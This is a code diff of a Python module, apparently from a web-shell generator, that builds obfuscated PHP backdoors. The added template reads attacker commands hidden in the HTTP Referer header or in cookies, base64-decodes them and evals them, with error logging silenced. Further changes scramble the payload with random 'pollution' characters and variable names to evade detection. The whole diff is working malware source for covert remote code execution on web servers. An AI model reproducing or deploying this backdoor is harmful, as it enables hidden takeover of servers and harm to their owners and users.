@@ -20,17 +20,32 @@ import base64, codecs
 from random import random, randrange, choice
 
 class Backdoor:
-	payload_template = """
+#	payload_template_old= """
+#ini_set('error_log', '/dev/null');
+#parse_str($_SERVER['HTTP_REFERER'],$a);
+#if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
+#echo '<%%%END_KEY%%%>';
+#eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
+#echo '</%%%END_KEY%%%>';
+#}
+#"""
+	payload_template= """
+function z($a) {
+if(reset($a)=='%%%START_KEY%%%' && count($a)>3) {
 ini_set('error_log', '/dev/null');
-parse_str($_SERVER['HTTP_REFERER'],$a);
-if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
 echo '<%%%END_KEY%%%>';
 eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
 echo '</%%%END_KEY%%%>';
+$b=0;
 }
+}
+$b=1;
+$ss=$_SERVER;$rr='HTTP_REFERER';
+if(array_key_exists($rr,$ss)){parse_str($ss[$rr],$r);z($r);}
+elseif($b) z($_COOKIE);	
 """
 
-	backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
+	#backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
 	
 	backdoor_template = """<?php 
 $%%PAY_VAR%%1="%%PAYLOAD1%%";
@@ -65,16 +80,19 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		
 	def __pollute_string(self, str, frequency=0.1):
 
-		pollution_chars = self.__random_string(16, True)
-
-		pollution = ''
-		for i in range(0, len(pollution_chars)):
-			pollution = pollution_chars[:i]
-			if (not pollution in str) :
+		while True:
+			pollution_chars = self.__random_string(16, True)
+	
+			pollution = ''
+			for i in range(0, len(pollution_chars)):
+				pollution = pollution_chars[:i]
+				if (not pollution in str) :
+					break
+				
+			if not pollution:
+				print '[!] Bad randomization, retrying.'
+			else:
 				break
-			
-		if not pollution:
-			raise Exception('Bad randomization, choose a different password')
 			
 		str_encoded = ''
 		for char in str:
@@ -116,6 +134,7 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		
 		
 		template = template.replace( '%%REPL_FUNC%%', replace_new_func_name )
+		
 		
 		return template
 			
